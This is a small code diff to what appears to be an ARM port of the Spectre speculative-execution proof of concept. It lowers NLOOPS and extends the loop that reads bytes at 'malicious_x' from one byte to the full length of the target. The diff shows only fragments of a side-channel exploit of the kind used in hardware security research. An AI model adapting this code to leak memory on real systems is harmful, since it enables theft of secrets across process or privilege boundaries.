@@ -7,7 +7,7 @@
 #include "sse2neon.h"
 
 #define MAX_TRIES 999
-#define NLOOPS 29
+#define NLOOPS 10
 #define NOCLFLUSH
 
 /* BEGIN ARM-specific parts: */
@@ -225,7 +225,7 @@ int main(int argc, const char **argv) {
             exfiltrated[i] = exfiltratedCharacter;
         }
     } else {
-        for (int i=0; i<1; ++i) {
+        for (int i=0; i<len; ++i) {
             printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
             readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
 
